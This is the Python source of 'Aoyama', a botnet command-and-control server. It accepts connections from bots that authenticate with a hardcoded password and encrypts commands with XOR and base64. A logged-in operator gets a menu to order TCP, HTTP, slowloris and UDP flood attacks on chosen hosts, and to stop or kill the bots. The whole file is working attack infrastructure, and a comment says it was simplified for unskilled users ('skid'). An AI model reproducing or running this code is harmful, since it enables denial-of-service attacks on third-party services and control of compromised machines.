#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
#Code by LeeOn123
#Created at 16/7/2019
#############################################################
#        d8888                                              #
#       d88888                                              #
#      d88P888                                              #
#     d88P 888 .d88b. 888  888 8888b. 88888b.d88b.  8888b.  #
#    d88P  888d88""88b888  888    "88b888 "888 "88b    "88b #
#   d88P   888888  888888  888.d888888888  888  888.d888888 #
#  d8888888888Y88..88PY88b 888888  888888  888  888888  888 #
# d88P     888 "Y88P"  "Y88888"Y888888888  888  888"Y888888 #
#                          888                              #
#                     Y8b d88P                              #
#                      "Y88P"                               #
#===========================================================#
#                   ~ version 1.0 ~                         #
#############################################################
import socket
import threading
import os
import time
import sys
import base64 as b64

key= "asdfghjkloiuytresxcvbnmliuytf"#xor key

if len(sys.argv)<=1:
	print("Usage: python3 cnc.py <port>")
	sys.exit()

b = int(sys.argv[1])

socketList = []
def sendCmd(cmd):#Send Commands Module
	print('[*]Command sent!!!')#debug
	print(cmd)
	data = xor_enc(cmd,key)#encode
	count = 0
	for sock in socketList:
		try:
			sock.settimeout(1)
			sock.send(data.encode())
			count+=1
		except:
			sock.close()
			socketList.remove(sock)#del error connection
			print("[!] A bot offline")
	print(str(count)+" bots got the command")
	global so
	so.send((str(count)+" bots exec the command\r\n").encode())
	scan_device()#check device after exec command
	

def scan_device():#scan online device
	print('scanning Online bot')
	for sock in socketList:
		try:
			sock.settimeout(1)
			sock.send(xor_enc("ping",key).encode())#check connection
			print("ping")
			sock.settimeout(2)
			pong = sock.recv(1024).decode()
			if xor_dec(pong,key) == "pong":
				print("pong")
			else:
				sock.close()
				socketList.remove(sock)
				print("[!] A bot offline")
		except:
			socketList.remove(sock)#del error connection
			print("[!] A bot offline")#debug

def showbot():#bot count
	while True:
		try:
			global so
			so.send(("\033]0;Nodes : "+str(len(socketList))+" \007").encode())
			time.sleep(1)
		except:
			return

def handle_bot(sock,socketList):
	while True:
		try:
			sock.settimeout(1)
			sock.send(xor_enc("ping",key).encode())#keepalive and check connection
			print("ping")
			sock.settimeout(2)
			pong = sock.recv(1024).decode()
			if xor_dec(pong,key) == "pong":
				print("pong")
				time.sleep(60)#check connection every min
			else:
				try:
					sock.close()
					socketList.remove(sock)
					print("[!] A bot offline")
					break
				except:
					break
		except:
			try:#must try here because the bot may removed from other function
				sock.close()
				socketList.remove(sock)
				print("[!] A bot offline")
			except:#bug happened here, if not add "break" then there will be a "magic" loop
				pass
			break

def waitConnect(sock,addr):
	try:
		passwd = sock.recv(1024).decode()
		if passwd == "UEBXUQ==" :#1337 after encode
			if sock not in socketList:
				socketList.append(sock)
				print("[!] A bot Online "+ str(addr)) #message
				handle_bot(sock,socketList)
		else:
			#removed Login code, more easy for skid
			#if passwd == "Login\r\n" or passwd == "Login":
			#If u are using putty pls use raw mode to connect, 
			#If connected, there will not show anything on screen
			#Just input 'Login' and enter.
			print("Somebody connected:"+str(addr))
			Commander(sock)
	except:
		sock.close()

def Commander(sock):#cnc server
	global so
	so = sock
	sock.send("Username:".encode())
	name = sock.recv(1024).decode()
	sock.send("Password:".encode())
	passwd = sock.recv(1024).decode()
	tmp = open("login.txt").readlines()#enter ur username and password in login.txt
	corret=0
	for x in tmp:
		tmp2 = x.split()
		#print(tmp2[0])#debug
		#print(tmp2[1])#
		if tmp2[0]+"\r\n" == name and tmp2[1]+"\r\n" == passwd:
			print("Commander here: "+tmp2[0])
			corret=1
	if corret != 1:
		sock.close()
		return
	sock.send("\033[36;1mSetting up the server\r\n".encode())#loading sense
	time.sleep(0.5)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("[!] Setting Up Connection Socket...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Updating Server Config...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Setting Up C&C Module...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Done...\r\n".encode())
	time.sleep(0.5)
	sock.send(("[!] Welcom to the Aoyama C&C Server, "+str(name.strip("\r\n"))+"\r\n").encode())
	sock.send("==============================================\r\n".encode())
	time.sleep(1)
	botn = threading.Thread(target=showbot,daemon=True)
	botn.start()


	while True:
		#print ("==> Python3 C&C server <==")
		sock.send((str(name.strip("\r\n"))+'@Aoyama:').encode())#if u run this on windows, it may has some bug, idk why so,i use linux.
		cmd_str = sock.recv(1024).decode()
		if len(cmd_str):
			if cmd_str[0] == '!':
				sendCmd(cmd_str)
				#sock.send(str(count)+"bots exec the command\r\n".encode())
			if cmd_str == 'scan' or cmd_str == 'scan\r\n':
				scan_device()
			if cmd_str == '?' or cmd_str == 'help' or cmd_str == '?\r\n' or cmd_str == 'help\r\n':
				sock.send('\r\n#-- Commands --#\r\n'.encode())
				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())	#http flood
				sock.send('  slowloris : !slow host port threads conn path\r\n'.encode())    #slowloris
				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())#udp flood
				sock.send('    !stop    : stop attack\r\n'.encode())
				sock.send('    !kill    : kill all the bots\r\n'.encode())
				sock.send('    bots     : count bot\r\n'.encode())
				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
				sock.send('    clear    : Clear screen\r\n'.encode())
				sock.send('    exit     : exit the server\r\n'.encode())
				sock.send('    shutdown : shutdown the server\r\n'.encode())
				sock.send('=============================================================\r\n'.encode())
			if cmd_str == 'bots' or cmd_str == 'bots\r\n':
				sock.send(("Nodes:"+str(len(socketList))+"\r\n").encode())
			if cmd_str == 'clear' or cmd_str == 'clear\r\n':
				sock.send("\033[2J\033[1H".encode())
				sock.send('        d8888                                              \r\n       d88888                                              \r\n      d88P888                                              \r\n     d88P 888 .d88b. 888  888 8888b. 88888b.d88b.  8888b.  \r\n    d88P  888d88""88b888  888    "88b888 "888 "88b    "88b \r\n   d88P   888888  888888  888.d888888888  888  888.d888888 \r\n  d8888888888Y88..88PY88b 888888  888888  888  888888  888 \r\n d88P     888 "Y88P"  "Y88888"Y888888888  888  888"Y888888 \r\n                          888                              \r\n                     Y8b d88P                              \r\n                      "Y88P"                               \r\n'.encode())
			if cmd_str == 'exit' or cmd_str == 'exit\r\n':
				sock.send(('Bye, '+str(name.strip("\r\n"))+'\033[0m\r\n').encode())
				sock.close()
				break
			if cmd_str == 'shutdown' or cmd_str == 'shutdown\r\n':#shutdown function
				sock.send('Shutdown\r\n'.encode())
				sock.close()
				print("shutdown from remote command")
				sys.exit()

def main():
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
	s.bind(('0.0.0.0',b))
	s.listen(1024)
	while True:
		sock, addr = s.accept()
		th = threading.Thread(target=waitConnect,args=(sock,addr),daemon=True)
		th.start()

def xor_enc(string,key):
    lkey=len(key)
    secret=[]
    num=0
    for each in string:
        if num>=lkey:
            num=num%lkey
        secret.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):
    leter = b64.b64decode( string.encode() ).decode()
    lkey=len(key)
    string=[]
    num=0
    for each in leter:
        if num>=lkey:
            num=num%lkey

        string.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return "".join( string )

if __name__ == '__main__':
	main()
